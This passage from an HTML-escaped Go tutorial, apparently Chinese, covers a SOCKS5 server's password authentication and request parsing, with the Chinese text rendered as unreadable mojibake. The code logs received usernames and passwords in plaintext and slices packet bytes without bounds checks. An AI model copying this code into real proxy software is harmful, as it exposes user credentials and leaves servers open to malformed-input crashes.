    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;è¯¥åè®®ä¸æ˜¯socks5åè®®&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ULEN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;UNAME&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ULEN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PLEN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ULEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PASSWD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PLEN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;UNAME&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PASSWD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;UNAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PASSWD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;è´¦å·å¯†ç é”™è¯¯&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    å›åº”å®¢æˆ·ç«¯,å“åº”å®¢æˆ·ç«¯è¿æ¥æˆåŠŸ
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    The server verifies the supplied UNAME and PASSWD, and sends the
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    following response:
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;                            +----+--------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;                            |VER | STATUS |
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;                            +----+--------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;                            | 1  |   1    |
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;                            +----+--------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    A STATUS field of X&amp;#39;00&amp;#39; indicates success. If the server returns a
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    `failure&amp;#39; (STATUS value other than X&amp;#39;00&amp;#39;) status, it MUST close the
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    connection.
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    */&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x05&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†å…¶å®ï¼Œç°åœ¨å¤§å®¶éƒ½ä¹ æƒ¯è‡ªå·±é‡‡ç”¨åŠ å¯†æµçš„æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œå¾ˆå°‘é‡‡ç”¨ç”¨æˆ·åå¯†ç çš„å½¢å¼è¿›è¡ŒåŠ å¯†ï¼Œåé¢ç« èŠ‚ä¼šä»‹ç»ä¸€ç§å¯¹ SOCKS çš„æ··æ·†åŠ å¯†æ–¹å¼ã€‚&lt;/p&gt;
&lt;h4 id=&#34;3è¯·æ±‚ä¿¡æ¯&#34;&gt;ï¼ˆ3ï¼‰è¯·æ±‚ä¿¡æ¯&lt;/h4&gt;
&lt;p&gt;è®¤è¯ç»“æŸåå®¢æˆ·ç«¯å°±å¯ä»¥å‘é€è¯·æ±‚ä¿¡æ¯ã€‚å¦‚æœè®¤è¯æ–¹æ³•æœ‰ç‰¹æ®Šå°è£…è¦æ±‚ï¼Œè¯·æ±‚å¿…é¡»æŒ‰ç…§æ–¹æ³•æ‰€å®šä¹‰çš„æ–¹å¼è¿›è¡Œå°è£…è§£å¯†ï¼Œå…¶åŸå§‹æ ¼å¼å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;VER&lt;/th&gt;
&lt;th&gt;CMD&lt;/th&gt;
&lt;th&gt;RSV&lt;/th&gt;
&lt;th&gt;ATYP&lt;/th&gt;
&lt;th&gt;DST.ADDR&lt;/th&gt;
&lt;th&gt;DST.PORT&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0x00&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;åŠ¨æ€&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;VER æ˜¯ SOCKS ç‰ˆæœ¬ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ 0x05ï¼›&lt;/li&gt;
&lt;li&gt;CMD æ˜¯ SOCK çš„å‘½ä»¤ç 
&lt;ul&gt;
&lt;li&gt;0x01 è¡¨ç¤º CONNECT è¯·æ±‚&lt;/li&gt;
&lt;li&gt;0x02 è¡¨ç¤º BIND è¯·æ±‚&lt;/li&gt;
&lt;li&gt;0x03 è¡¨ç¤º UDP è½¬å‘&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RSV 0x00ï¼Œä¿ç•™&lt;/li&gt;
&lt;li&gt;ATYP DST.ADDR ç±»å‹&lt;/li&gt;
&lt;li&gt;DST.ADDR ç›®çš„åœ°å€
&lt;ul&gt;
&lt;li&gt;0x01 IPv4 åœ°å€ï¼ŒDST.ADDR éƒ¨åˆ† 4 å­—èŠ‚é•¿åº¦&lt;/li&gt;
&lt;li&gt;0x03 åŸŸåï¼ŒDST.ADDR éƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºåŸŸåé•¿åº¦ï¼ŒDST.ADDR å‰©ä½™çš„å†…å®¹ä¸ºåŸŸåï¼Œæ²¡æœ‰\0 ç»“å°¾ã€‚&lt;/li&gt;
&lt;li&gt;0x04 IPv6 åœ°å€ï¼Œ16 ä¸ªå­—èŠ‚é•¿åº¦ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DST.PORT ç½‘ç»œå­—èŠ‚åºè¡¨ç¤ºçš„ç›®çš„ç«¯å£&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä»£ç å®ç°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Socks5Resolution&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;CMD&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;RSV&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;DSTADDR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;DSTPORT&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint16&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;DSTDOMAIN&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;RAWADDR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TCPAddr&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Socks5Resolution&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;lstRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;è¯·æ±‚åè®®é”™è¯¯&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;è¯¥åè®®ä¸æ˜¯socks5åè®®&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CMD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CMD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;å®¢æˆ·ç«¯è¯·æ±‚ç±»å‹ä¸ä¸ºä»£ç†è¿æ¥, å…¶ä»–åŠŸèƒ½æš‚æ—¶ä¸æ”¯æŒ.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;RSV&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//RSVä¿ç•™å­—ç«¯ï¼Œå€¼é•¿åº¦ä¸º1ä¸ªå­—èŠ‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//	IP V4 address: X&amp;#39;01&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTADDR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;IPv4len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//	DOMAINNAME: X&amp;#39;03&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTDOMAIN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;ipAddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;ResolveIPAddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTDOMAIN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTADDR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ipAddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;IP&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//	IP V6 address: X&amp;#39;04&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTADDR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;IPv6len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;IPåœ°å€é”™è¯¯&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
